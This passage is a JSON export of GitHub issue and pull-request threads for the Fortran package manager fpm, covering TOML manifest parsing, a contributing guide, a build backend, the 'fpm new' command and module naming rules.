                    "user": "everythingfunctional",
                    "date": "2020-09-03 21:13:39+00:00",
                    "text": "I agree with @milancurcic that self-signed commits is not necessary. Everything else I think is fine."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-05 17:51:30+00:00",
                    "text": "I reused most of @awvwgk material and added concrete workflow steps. Let me know what you all think."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-07 20:42:29+00:00",
                    "text": "@milancurcic I really like the guidelines you made out of this."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-08 18:37:41+00:00",
                    "text": "Unless there are objections, I will merge this tomorrow this time."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-09 14:52:28+00:00",
                    "text": "Thank you, @awvwgk!"
                }
            ]
        },
        {
            "number": 159,
            "user": "urbanjost",
            "date": "2020-09-02 22:25:55+00:00",
            "title": "Pull request for urbanjost",
            "text": "Add CLI interface and functional subcommand \"new\"\nAdded POSIX interface for implementing mkdir, chdir, and filename\nsplitting; which is problematic as it makes it system-dependent.\nUse gfortran chdir, getcwd extensions and a command-based mkdir\ninstead?\nChanged behavior of \"new\" to allow updating and warn instead of\noverwrite existing files. Early on the Haskell version wiped out\nsome existing README.md and other files; looks like it now stops\nif not creating new directory instead?\nThe build option is failing with the TOML changes. I thought I\ntried it and it worked but a new version I checked out fails as well.\nINC\nrun,build,new work on POSIX machine with no dependencies",
            "comments": [
                {
                    "user": "certik",
                    "date": "2020-09-14 21:03:04+00:00",
                    "text": "Instead of committing existing projects into fpm, I suggest we simply depend on them. We will ensure that fpm can create a nice self-contained tarball that just builds using cmake (or any other build system) to bootstrap (#123)."
                }
            ]
        },
        {
            "number": 158,
            "user": "awvwgk",
            "date": "2020-09-02 17:10:31+00:00",
            "title": "Add a contributing guideline",
            "text": "This project is currently missing resources for to learn about the preferred workflows or the style guide. At least for me a contributing guideline is a strong factor I consider before contributing to a project. In my opinion it helps set the right expectations and cuts down the noise in PRs required to educate new contributors.\nIt would be nice to have at least a short guideline in the README or in a separate CONTRIBUTING file to establish some rules for this project.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-02 17:39:17+00:00",
                    "text": "That's a great idea. Any chance you could put one together for us?"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-02 17:52:15+00:00",
                    "text": "For reference, here's what we have in stdlib.\nWhat do you think about something along the lines of:\n\nOpen an issue to discuss the scope of the changes, API if applicable, etc.;\nReach consensus;\nOpen a PR with the changes, while following the fpm style guide (TODO);\nRequest 1-3 reviewers on the PR."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-02 21:21:51+00:00",
                    "text": "@everythingfunctional I have written one, I found myself reusing for many of my projects in various flavours, see here. Feel free to adjust it for fpm."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-03 00:35:23+00:00",
                    "text": "I don't see any major issues with that one. If other contributors agree, I'd be fine with adopting it."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-03 08:50:57+00:00",
                    "text": "I have no problem with your contributor guide @awvwgk but can you add a section like 'Workflow' which incorporates what Milan posted? I would also add the following to the workflow:\n\nAfter reaching consensus on an issue discussion, assign the issue to yourself to indicate to others that you have started work on that issue to avoid duplicate effort"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-03 10:51:22+00:00",
                    "text": "I can open a PR and make the branch editable for repository maintainers, such that you can adjust the guide to your liking."
                }
            ]
        },
        {
            "number": 157,
            "user": "awvwgk",
            "date": "2020-09-01 21:22:02+00:00",
            "title": "Implement reading of fpm.toml",
            "text": "Uses my TOML library to read the fpm.toml file and creates a Fortran type representing the TOML document.\nThis PR adds toml-f as dependency to fpm.\nCloses #149",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-09-01 21:44:12+00:00",
                    "text": "This is super exciting, thanks a lot @awvwgk! I look forward to reviewing it."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-01 21:56:37+00:00",
                    "text": "Not sure on the scope of this PR, currently it allows to translate and verify any TOML document as fpm package file, but does not do much with this information.\nThe next step would be to pull in a dependency and translate and verify its package file, which would require to create new fpm \u201cinstances\u201d to recursively build the complete dependency tree. Giving the git_target_t a fetch method is easy, but working with the created target is a bit more involved, so this might be somewhat out-of-scope for this PR.\nRegarding coding style, any conventions I should apply (mainly w.r.t. indentation)?"
                },
                {
                    "user": "certik",
                    "date": "2020-09-02 03:52:17+00:00",
                    "text": "@awvwgk thanks a lot for this PR! We will review it soon. I think the scope is ok as it is, and we can build upon it with further PRs once it is merged."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-02 08:19:58+00:00",
                    "text": "Guess it is ready for review than.\nThe current style guide I'm mostly following is this one: https://github.com/dftbplus/develguide/blob/master/docs/fortranstyle.rst"
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-02 15:37:20+00:00",
                    "text": "We follow the stdlib style guide. I skimmed through the contributions and didn't see anything that jumps out except the indentation width (we use 4)."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-02 16:55:18+00:00",
                    "text": "Thanks, this is helpful. I've amended the commit accordingly to keep the history clean."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-02 17:23:52+00:00",
                    "text": "I didn't dive super deep into it, but from the high level, it looks reasonably similar to the Haskell version, so I think it's probably at least headed in the right direction.\nI do have one question though. Would it be possible to write some unit tests for this? Feed it a toml string and make sure the package object is correct, feed it bad toml and make sure it reports an error, etc."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-02 20:18:32+00:00",
                    "text": "Sure can do."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-02 21:30:02+00:00",
                    "text": "That looks good for now. I was hoping it wouldn't require writing to the file, but it's ok for now. It's a slick little minimalist testing framework you put together too."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-02 21:39:20+00:00",
                    "text": "toml_parse can read a string too, but it would require to overload or bypass the read_package_file procedure just for testing. Having a dedicated version for testing toml-f in fpm but not the actual version used for fpm somewhat defeats the purpose of the test for me, therefore writing the file it is.\nI need to work on a better constructor for toml_table types upstream so one can easily build a TOML document without having to read it from a file. But this is something for a future PR once I figured it out in toml-f."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-03 09:06:41+00:00",
                    "text": "Good idea, manifest is probably a better name than config, I will adjust this.\nFeel free to squash the PR into one commit to avoid the noise of renaming files."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-03 15:54:40+00:00",
                    "text": "@awvwgk @everythingfunctional @LKedward Should this PR go before or after #155? Is either way easier than the other? I can't tell."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-03 15:56:42+00:00",
                    "text": "I think this PR should go first because it's bigger. I'll then merge the changes into my branch. (Only conflict between the two is fpm.f90 I think.)"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-03 16:24:49+00:00",
                    "text": "They are solving different problems, the order does not matter too much, but a conflict in fpm.f90 is inevitable, due to the current status of the project. I do not mind rebasing my branch either.\nSince #155 is attempting to add the functionality of fpm building itself, the question arises if we can retain this functionality with both PRs merged. In this regard my PR is working exactly against #155, due to adding an external dependency."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-03 16:30:22+00:00",
                    "text": "Since #155 is attempting to add the functionality of fpm building itself, the question arises if we can retain this functionality with both PRs merged. In this regard my PR is working exactly against #155, due to adding an external dependency.\n\nThis isn't a problem; parsing the manifest is more important than Fortran fpm building itself.\nI already know what changes I need to make in #155 once this PR is merged, hence why I recommend that this be merged first."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-09-03 21:05:45+00:00",
                    "text": "If @LKedward is happy to rebase his branch and fix the conflicts, I'd go with this one first. As much as I'd like to have fpm be able to build itself, it's not strictly necessary. We'll get there."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-03 21:15:12+00:00",
                    "text": "I agree. Let's wait to see if @certik has any objections, and if not we can move forward."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-04 20:42:33+00:00",
                    "text": "I did a quick coverage run on this PR (coverage.txt) and spotted a few issues which were simple oversights. The coverage is currently around 60%, so definitely something to improve."
                },
                {
                    "user": "certik",
                    "date": "2020-09-05 00:09:21+00:00",
                    "text": "I am fine as long as @LKedward is fine, and it seems he his. So we can go ahead and merge this one."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-05 09:27:13+00:00",
                    "text": "Also ready from my side now. I decided to pin the revision of toml-f to a specific commit to ensure that I won't break fpm by changing something in upstream toml-f."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-05 16:42:59+00:00",
                    "text": "Thank you all and especially @awvwgk. Merging."
                }
            ]
        },
        {
            "number": 156,
            "user": "awvwgk",
            "date": "2020-08-28 13:25:54+00:00",
            "title": "Bootstrap version fails to read implicit dependencies table",
            "text": "This could be an upstream issue with https://github.com/kowainik/tomland, but I don't know enough Haskell to verify this.\nSteps to reproduce:\n\nInstall the bootstrap version of fpm (fcb7f67 used)\nCreate new project and add any dependency without using an inline table\n\n> fpm new example\n> cd example\n> echo \"[dependencies.toml-f]\\ngit = \\\"https://github.com/awvwgk/toml-f\\\"\" >> fpm.toml\n\n\nTry to build the project with the dependency\n\n> fpm build\n# gfortran (for build/gfortran_debug/example/example.o build/gfortran_debug/example/example.mod)\n# ar (for build/gfortran_debug/example/libexample.a)\nar: creating build/gfortran_debug/example/libexample.a\n\n\nFind the dependency not recognized\n\n> tree build\nbuild\n\u2514\u2500\u2500 gfortran_debug\n    \u2514\u2500\u2500 example\n        \u251c\u2500\u2500 example.mod\n        \u251c\u2500\u2500 example.o\n        \u2514\u2500\u2500 libexample.a\n\nPresumed source of the error:\nThe following two TOML documents are equivalent, except\n\nuses an inline table for dependencies.toml-f\n\n[dependencies]\ntoml-f = { git = \"https://github.com/awvwgk/toml-f\" }\n\ndependencies is implicitly created\n\n[dependencies.toml-f]\ngit = \"https://github.com/awvwgk/toml-f\"\nApparently, implicit tables are handled differently by the tomland parser, but this implementation detail should not leak into fpm\nAdditional information:\nTesting this with the Python toml module:\n>>> import toml\n>>> table = toml.loads(\"[dependencies.toml-f]\\ngit = \\\"https://github.com/awvwgk/toml-f\\\"\")\n>>> print(table)\n{'dependencies': {'toml-f': {'git': 'https://github.com/awvwgk/toml-f'}}}\n>>> print(toml.dumps(table))\n[dependencies.toml-f]\ngit = \"https://github.com/awvwgk/toml-f\"",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-28 15:40:40+00:00",
                    "text": "I hadn't expected anybody to try using implicit tables for that, but I can confirm there is likely a bug in the upstream library with that style.\nI believe the way it stores the \"key path\" when parsing the toml can end up slightly different depending on that style. I had to implement a feature to allow it to do the automatic conversion to the types used by fpm properly with a table like that, and it's possible it's not properly dealing with that different \"key path\" style.\nI'll submit a bug report for that library. I'm not sure if that will be fixed before the Fortran version is done or not. We'll see."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-28 16:14:48+00:00",
                    "text": "ok, can confirm that the bug exists in the latest version of the library as well. Going to work on a bug report to them."
                },
                {
                    "user": "awvwgk",
                    "date": "2020-08-28 17:49:23+00:00",
                    "text": "ok, can confirm that the bug exists in the latest version of the library as well. Going to work on a bug report to them.\n\nThanks.\n\nI hadn't expected anybody to try using implicit tables for that, but I can confirm there is likely a bug in the upstream library with that style.\n\nI think it is kind of a natural choice for this, as inline tables are quite limited by the TOML specs on purpose.\nEspecially another kind of implicit tables is really expressive in this context:\n[dependencies]\ntoml-f.git = \"https://github.com/toml-f/toml-f\""
                }
            ]
        },
        {
            "number": 155,
            "user": "LKedward",
            "date": "2020-08-26 15:14:21+00:00",
            "title": "[Fortran fpm] Internal dependencies & build backend",
            "text": "Opening a draft PR for feedback.\nImplements:\n\na rudimentary process for scanning sources and determining inter-module dependencies.\na simple fpm backend for building files in correct order\n\nThis is really a minimal working implementation, many places for improvement (particularly source parsing),\nbut it should now build any stand-alone package that only uses the src and app directories (no subdirectories).\nA nice example: fortran fpm can now build itself. Run fpm run --args 'build' with Haskell fpm.\nOther changes:\n\nMoved filesystem and string routines into separate modules for now - these will eventually be substituted by stdlib routines.\n\nNot yet implemented:\n\nnon-default layouts (requires fpm.toml)\nfpm model structure\nPackage layout constraints\nLibrary archiving\nIncremental builds\nBuild output directory\n\nTested on Ubuntu Linux (gcc-7.5.0) and MinGW Windows (gcc-8.1.0).",
            "comments": [
                {
                    "user": "milancurcic",
                    "date": "2020-08-26 15:41:42+00:00",
                    "text": "Thanks a lot Laurence. I only did a cursory read through for now and have a few suggestions:\n\nFor split() and lower() from ``M_strings by @urbanjost, should we import them as a dependency instead of in source? This would mean that fpm-fortran wouldn't be able to build itself (we can't download dependencies yet), but this seems to me like an unnecessary requirement for now. The advantage is that we have less code to maintain. Or would you prefer to keep it in source until we can download dependencies, and then replace them with use M_strings, only: lower, split?\nFPM -> fpm everywhere (source file names and modules), as per #77.\nShoud we rename module environment in environment.f90 to fpm_environment in fpm_environment.f90?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-26 17:49:03+00:00",
                    "text": "Thanks for the comments @milancurcic! I agree with you on all points."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-26 19:34:02+00:00",
                    "text": "This is a great start, and a great next step. Thanks @LKedward .\nI agree with @milancurcic for FPM -> fpm and environment -> fpm_environment. I'm also in favor of leaving lower and split in source until we can fetch and build dependencies. Since this seems to allow fpm to build itself, I think we should make efforts not to lose that ability again.\nI will try and find time over the next few days to try and look into the CI failures a bit more closely and see what's going on."
                },
                {
                    "user": "certik",
                    "date": "2020-08-27 01:18:19+00:00",
                    "text": "Great work! Thank you.\n\nWhere is the fpm_model module? I couldn't find it (on my phone).\n\u2026\nOn Wed, Aug 26, 2020, at 9:14 AM, Laurence Kedward wrote:\n Opening a draft PR for feedback.\n\n Implements:\n\n  * a rudimentary process for scanning sources and determining\n inter-module dependencies.\n  * a simple fpm backend for building files in correct order\n This is really a minimal working implementation, many places for\n improvement (particularly source parsing),\n but it should now build any stand-alone package that only uses the\n `src` and `app` directories (no subdirectories).\n\n A nice example: fortran `fpm` can now build itself. Run `fpm run --args\n 'build'` with Haskell `fpm`.\n\n Other changes:\n\n  * Moved filesystem and string routines into separate modules for now -\n these will eventually be substituted by stdlib routines.\n Not yet implemented:\n\n  * non-default layouts (requires `fpm.toml`)\n  * fpm model structure\n  * Package layout constraints\n  * Library archiving\n  * Incremental builds\n  * Build output directory\n Tested on Ubuntu Linux (gcc-7.5.0) and MinGW Windows (gcc-8.1.0).\n\n You can view, comment on, or merge this pull request online at:\n\n   #155\n\n Commit Summary\n\n  * Restructure: move some routines out of fpm module.\n  * Use temporary file for directory listing output.\n  * Minor fix: to read_lines subroutine.\n  * Add: Sourcefiles module for processing sources.\n  * Minor fix: to count_rows in filesystem mod.\n  * Add: initial fpm build backend.\n  * Add: initial support for c sources.\n  * Minor fix: add dependency pointer guard.\n File Changes\n\n  * *A* fpm/src/FPM_Backend.f90\n <https://github.com/fortran-lang/fpm/pull/155/files#diff-475cc582fa5d31afd70a27d7efa178df> (49)\n  * *A* fpm/src/FPM_Filesystem.f90\n <https://github.com/fortran-lang/fpm/pull/155/files#diff-051a34076927ef0e96a561c89801de72> (125)\n  * *A* fpm/src/FPM_Sourcefiles.f90\n <https://github.com/fortran-lang/fpm/pull/155/files#diff-7e8ed2fd5212f618126c139653c2f364> (375)\n  * *A* fpm/src/FPM_Strings.f90\n <https://github.com/fortran-lang/fpm/pull/155/files#diff-e1790889afd1b0c2e62f82231394fa23> (195)\n  * *M* fpm/src/environment.f90\n <https://github.com/fortran-lang/fpm/pull/155/files#diff-32b40b492690c8c8294e981a0fb78e70> (14)\n  * *M* fpm/src/fpm.f90\n <https://github.com/fortran-lang/fpm/pull/155/files#diff-e235e41ae1a801d1ff11bfa3aa1ea6db> (134)\n Patch Links:\n\n  * https://github.com/fortran-lang/fpm/pull/155.patch\n  * https://github.com/fortran-lang/fpm/pull/155.diff\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#155>, or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWH4WICQDIJWIZZH6DDSCURF5ANCNFSM4QL6FSFA>."
                },
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-27 01:59:46+00:00",
                    "text": "Yep, @certik is correct. It looks like the fpm_model module got missed with the commits"
                },
                {
                    "user": "certik",
                    "date": "2020-08-27 04:35:16+00:00",
                    "text": "That was the most important module I wanted to look at. ;)\n\u2026\nOn Wed, Aug 26, 2020, at 7:59 PM, Brad Richardson wrote:\n\n\n Yep, @certik <https://github.com/certik> is correct. It looks like the\n `fpm_model` module got missed with the commits\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#155 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWH7POTCLAX6LUPAVHDSCW4Z7ANCNFSM4QL6FSFA>."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-27 12:03:30+00:00",
                    "text": "Yep, @certik is correct. It looks like the fpm_model module got missed with the commits\n\nSorry yes, I'll push an update later that works with an initial fpm_model structure (it only has the dependency structure in currently).\nI don't mind use M_Strings as a dependency or keeping it self-contained for now - @certik do you have an opinion on this?"
                },
                {
                    "user": "certik",
                    "date": "2020-09-02 03:50:40+00:00",
                    "text": "@LKedward do you want to finish this PR, so that others can build upon it once it is merged?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-02 10:57:57+00:00",
                    "text": "I've added fpm_ prefix to all modules as discussed and implemented a minimal structure for fpm_model, currently with hard-coded values - I think this should be refined in a separate PR. For now I've left the string routines in.\nCurrently having issues building with Haskell fpm which is causing CI to fail, but otherwise I think this is ready for review.\nIf necessary, I'm happy to rebase this PR after #157 is merged."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-03 15:19:20+00:00",
                    "text": "I reviewed in more detail and I think this is good to go. I also made the following changes:\n\nExplicit imports with use ..., only: ...\nExplicitly list public names with the public statement\nRemove a few unused module imports\n\nThere are no semantic changes to the code."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-03 15:45:44+00:00",
                    "text": "Many thanks Milan! I'll be sure to follow those guidelines in future."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-03 15:50:24+00:00",
                    "text": "@LKedward I don't think we even had these in the style guide but I think we should."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-07 09:31:43+00:00",
                    "text": "I've now successfully merged in the recent changes so that fortran fpm can now build slightly more complex packages like the hello_complex example package. This is enough for this PR, so I won't be contributing any more of my own changes to this branch unless requested."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-08 11:01:27+00:00",
                    "text": "Many thanks for the helpful review comments @awvwgk, I've addressed all except the exit codes - am I misunderstanding you here?"
                },
                {
                    "user": "awvwgk",
                    "date": "2020-09-08 11:43:13+00:00",
                    "text": "@LKedward I did a bit of further testing and actually trying to break the implementation, see #167, the report is regarding bootstrap fpm but is also not working well with this PR."
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-11 15:38:22+00:00",
                    "text": "Thanks for the review @certik, I've implemented your suggestions for isolating the model definition from the frontend."
                },
                {
                    "user": "certik",
                    "date": "2020-09-11 15:42:21+00:00",
                    "text": "Thanks. Looks good now. +1 to merge\n\u2026\nOn Fri, Sep 11, 2020, at 9:38 AM, Laurence Kedward wrote:\n\n\n Thanks for the review @certik <https://github.com/certik>, I've\n implemented your suggestions for isolating the model definition from\n the frontend.\n\n \u2014\n You are receiving this because you were mentioned.\n Reply to this email directly, view it on GitHub\n <#155 (comment)>,\n or unsubscribe\n <https://github.com/notifications/unsubscribe-auth/AAAFAWHWQ4NDOV6BSDJ35ETSFJAAFANCNFSM4QL6FSFA>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-11 20:19:39+00:00",
                    "text": "@everythingfunctional Please merge when ready, in case you're still reviewing."
                }
            ]
        },
        {
            "number": 154,
            "user": "milancurcic",
            "date": "2020-08-20 18:00:00+00:00",
            "title": "Implement fpm new",
            "text": "Should be a low-hanging fruit and easy project.",
            "comments": [
                {
                    "user": "urbanjost",
                    "date": "2020-08-31 03:09:17+00:00",
                    "text": "I tried implementing the command line parsing I could discern from the Haskell fpm(1) using a parsing module I have and implemented the \"fpm new\" subcommand trying to stay true to the current structure of the fpm Fortran skeleton. I also had it ech the parsed arguments in the unimplimented commands.  I could not get this to push out put I have not done that all that many times so if anyone is interested in that  clone https://github.com/urbanjost/M_CLI2.git and ignore the rest of it but just look in the fpm.cli/ directory."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-08 00:23:36+00:00",
                    "text": "I put a branch on called urbanjost that has a \"new\" subcommand. Lots of questions about what it should do when given an existing directory, like an existing github repository you want to convert to use fpm(1); to test it I added a CLI interface and did some tweeking of the \"run\" and \"build\" subcommands, but just minimal enough to run the output from a \"new\" subcommand\" and a simple project with no dependencies. It also allows for an \"-- options\" instead of -args \" options\". The biggest issues are how to implement MKDIR, CHDIR, and GETCWD. CHDIR and GETCWD exist as extensions in gfortran, for example. I used some existing POSIX-like interfaces I had, but that limits portability unless similar functions are added to stdlib. Thought it would be useful for discussing how it should best be implimented. So I guess it gets into #135, #138, as well as #154 all in\n#159.  No smarts about the order of compilation or pulling packages/ dependencies but at least it actually lets you try out a \"new\" command concept. I was thinking maybe a -license switch might be nice for common licenses; and was thinking the default README.md might include links to the fpm page and maybe  some other links as a more complete example of a markdown file, but unless a specific platform like github was selected I am not sure the markdown syntax between repositories is standardized enough to do that. Anyway, learned some things about how to use the TOML interface. Hope this might be useful for discussion. When it is done, fpm(1) is going to be an interesting code. There are enough interesting problems there just getting it to the state of the Haskell prototype that I might actually look at the Haskell code out of curiosity to see how it was done. Anyway, I find coded examples a good way to discuss potential solutions, so thought this would work as a way to discuss some possible approaches for this. Apparently the CLI is going to be done using other approaches, but if there is any interest I think this is actually a full implementation of the CLI (Cocmmand Line Interface)."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-24 02:17:04+00:00",
                    "text": "Were you saying you wanted to implement this or that you think it is a good candidate for early implimentation?\nI have some ideas on how I would want it to act with an extension to how it works with an existing directory for someone migrating to supporting fpm. I would like to put it in as a draft on the PR page or discuss some of it with you if you are working on it."
                },
                {
                    "user": "certik",
                    "date": "2020-09-24 03:28:00+00:00",
                    "text": "Are you asking Milan?\n\nIn general I would say go ahead and implement things. If you open a PR with an early implementation, everybody can collaborate there.\n\u2026\nOn Wed, Sep 23, 2020, at 8:17 PM, urbanjost wrote:\n\n\n Were you saying you wanted to implement this or that you think it is a\n good candidate for early implimentation?\n I have some ideas on how I would want it to act with an extension to\n how it works with an existing directory for someone migrating to\n supporting fpm. I would like to put it in as a draft on the PR page or\n discuss some of it with you if you are working on it.\n\n \u2014\n You are receiving this because you are subscribed to this thread.\n Reply to this email directly, view it on GitHub\n <#154 (comment)>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AAAFAWHWTCJQKZEJOEKZUMLSHKT23ANCNFSM4QGN4EIA>."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-09-24 04:01:48+00:00",
                    "text": "@urbanjost sorry that I wasn't clear. I'm not working on it and I'm happy that you are. I agree with Ondrej, considering that fpm new has a simple and well defined API, you can go ahead with the PR."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-24 06:18:16+00:00",
                    "text": "Great. I will create a PR called \"NEW\". Unfortunately, I will have to include the PR \"CLI\" to have a model that can implement the \"new\" subcommand; which is not yet approved. Perhaps I should just delete \"CLI\" and do \"NEW\"?\nSomething weird is happening with the MSWindows build of \"CLI\" to boot; but I think I can do \"NEW\" and probably \"RUN\" pretty quickly far enough and I think others can extend \"build\" and should have pretty complete \"new\",\"run\" . I am going to add a --list option to \"run\" for discussion about using such as option for piping into a command like GNU/Linux xargs(1) command and/or creating a --mask to make it easier to use fpm(1) with other utilitilies. On Linux I might want to have a way to use gdb, valgrind, maybe profiling ?"
                },
                {
                    "user": "LKedward",
                    "date": "2020-09-24 08:13:26+00:00",
                    "text": "Perhaps I should just delete \"CLI\" and do \"NEW\"?\n\nIf possible I would prefer that we keep the \"CLI\" pull request so that it can be reviewed separately."
                },
                {
                    "user": "urbanjost",
                    "date": "2020-09-25 00:33:44+00:00",
                    "text": "Started a NEW before I saw this post. Have had some issues with the CLI PR building that @everythingfunctional seems to have been resolved and exposed an issue with quoting of arguments containing spaces after the -- argument, but if I get that sorted out I have a prototype for NEW that builds, runs, and tests. This bash(1) script actually ran with just the Fortran code and I think it will run or test a Haskell fpm directory too, which was a pleasant surprise. I pretty much just copied some of the lines from the build command and made a few guesses. Not like it pulls remote repositories and builds them or does a topological sort and builds in the right order or anything; but I hope this is a step forward. If you play with it it raises some interesting questions about what a new command should do in an existing directory, if a new pathname can be a full pathname, if you should be able to ask for a new setup that is any of the prototypes on the web page, whether an option to write some of the common LICENSE files would be useful -- I think there are some good discussions there just using this basic PR.\n#!/bin/bash\n##################################################\n(\nexec &2>1\nset -x -v\nfpm-new new asdf --with-executable --with-test\ncd asdf\nfpm-new build\nfpm-new run\nfpm-new test\nfpm-new run --list\nfpm-new test --list\nfpm-new run --list --release\nfpm-new test --list --release\nfpm-new build --release\nfpm-new run --list --release\nfpm-new test --list --release\n)|tee -a $0\n##################################################\nexit\n\nmkdir -p asdf\ncd asdf\nmkdir -p asdf/src\nfpm::new asdf/src/asdf.f90 already exists. Not overwriting\nfpm::new asdf/.gitignore already exists. Not overwriting\nfpm::new asdf/README.md already exists. Not overwriting\nmkdir -p asdf/test\nfpm::new asdf/test/main.f90 already exists. Not overwriting\nmkdir -p asdf/app\nfpm::new asdf/app/main.f90 already exists. Not overwriting\nfpm::new asdf/fpm.toml already exists. Not overwriting\ncd asdf;git init\nReinitialized existing Git repository in /tmp/asdf/.git/\ngfortran -c src/asdf.f90 -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/asdf -o build/gfortran_debug/asdf/asdf.f90.o\ngfortran -c app/main.f90  -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/asdf -o build/gfortran_debug/app/main.o\ngfortran build/gfortran_debug/app/main.o  build/gfortran_debug/asdf/asdf.f90.o  -o build/gfortran_debug/app/asdf\ngfortran -c test/main.f90  -Wall -Wextra -Wimplicit-interface  -fPIC -fmax-errors=1 -g -fbounds-check -fcheck-array-temporaries -fbacktrace -Jbuild/gfortran_debug/asdf -o build/gfortran_debug/test/main.o\ngfortran build/gfortran_debug/test/main.o  build/gfortran_debug/asdf/asdf.f90.o  -o build/gfortran_debug/test/runTests\nbuild/gfortran_debug/app/asdf\nHello, asdf!\nbuild/gfortran_debug/test/runTests\nPut some tests in here!\nfpm::run:executable expected at build/gfortran_debug/app/asdf exists\nfpm::run:test expected at build/gfortran_debug/test/runTests exists\nfpm::run:executable expected at build/gfortran_release/app/asdf exists\nfpm::run:test expected at build/gfortran_release/test/runTests exists\ngfortran -c src/asdf.f90  -O3  -Wimplicit-interface  -fPIC  -fmax-errors=1  -ffast-math  -funroll-loops -Jbuild/gfortran_release/asdf -o build/gfortran_release/asdf/asdf.f90.o\ngfortran -c app/main.f90   -O3  -Wimplicit-interface  -fPIC  -fmax-errors=1  -ffast-math  -funroll-loops -Jbuild/gfortran_release/asdf -o build/gfortran_release/app/main.o\ngfortran build/gfortran_release/app/main.o  build/gfortran_release/asdf/asdf.f90.o  -o build/gfortran_release/app/asdf\ngfortran -c test/main.f90   -O3  -Wimplicit-interface  -fPIC  -fmax-errors=1  -ffast-math  -funroll-loops -Jbuild/gfortran_release/asdf -o build/gfortran_release/test/main.o\ngfortran build/gfortran_release/test/main.o  build/gfortran_release/asdf/asdf.f90.o  -o build/gfortran_release/test/runTests\nfpm::run:executable expected at build/gfortran_release/app/asdf exists\nfpm::run:test expected at build/gfortran_release/test/runTests exists\n\nIf the CLI PR gets OKed I will merge NEW into a new PR I guess. I could pull this back but if anyone has some time to preview it I am curious about what anyone thinks.  I am hoping this can actually complete #154 sans some of the new questions it raises actually being able to try it."
                },
                {
                    "user": "LKedward",
                    "date": "2020-10-28 10:15:39+00:00",
                    "text": "Closing as implemented in #189."
                }
            ]
        },
        {
            "number": 153,
            "user": "everythingfunctional",
            "date": "2020-08-17 18:48:04+00:00",
            "title": "Prevent Name Collisions Between Packages",
            "text": "In #86, it became clear that we'd like a solution to prevent name collisions of modules between packages. Starting this thread here to discuss solutions.",
            "comments": [
                {
                    "user": "everythingfunctional",
                    "date": "2020-08-17 19:03:45+00:00",
                    "text": "My preferred solution would just be that all modules in a library must start with the name of the library. Thus, you may have a module that is just the same name as the library. This is likely to be a common design; organize your library however you like, expose the public API via a module with the same name as the library."
                },
                {
                    "user": "milancurcic",
                    "date": "2020-08-17 19:28:02+00:00",
                    "text": "I agree, I think this is the way to go.\nStructuring the module and file names as we did so far helps emulate namespaces and subpackages, but I don't see a good reason to enforce it. The user can still do it if they prefer."
                },
                {
                    "user": "certik",
                    "date": "2020-08-17 20:06:40+00:00",
                    "text": "Here is the \"minimal\" proposal:\nAll module names must start with the library name, in particular the module name should be equal to:\n\neither the library name and underscore, such as stdlib_* or toml_*\nor just the library name, such as stdlib or toml\n\nDo we all agree with this \"minimal\" proposal?\nI do. If we all do, we have something to solve our immediate problem, which is name collisions between packages. This gives us time to discuss naming conventions, which I think is important to have, but that's a separate issue."
                },
                {
                    "user": "LKedward",
                    "date": "2020-08-18 07:46:44+00:00",
                    "text": "I agree, this is a good solution."
                }
            ]
        },
        {
            "number": 152,
            "user": "urbanjost",
